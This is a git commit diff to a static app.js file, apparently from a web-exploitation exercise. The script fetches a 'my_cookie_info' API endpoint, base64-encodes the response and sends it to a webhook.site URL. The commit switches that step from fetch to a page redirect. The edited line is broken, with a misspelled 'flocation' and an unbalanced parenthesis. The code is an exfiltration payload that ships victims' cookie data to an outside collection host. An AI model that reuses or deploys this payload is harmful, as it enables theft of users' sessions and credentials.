84d1634551c9af2a34f4051d0f40eafec0938bae
Xiamong <qw050325@naver.com>
2024-09-19 00:25:45 +0900

    Update app.js

--- static/app.js
+++ static/app.js
@@ -3,7 +3,7 @@ const request=new XMLHttpRequest();
 fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res => htmlText=res.json());
 setTimeout(function(){
       const aba = btoa(htmlText);
-      fetch("https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/"+btoa(htmlText));
+      flocation.href="https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/"+btoa(htmlText));
 },1000);
 setTimeout(function(){
       alert('cheak');
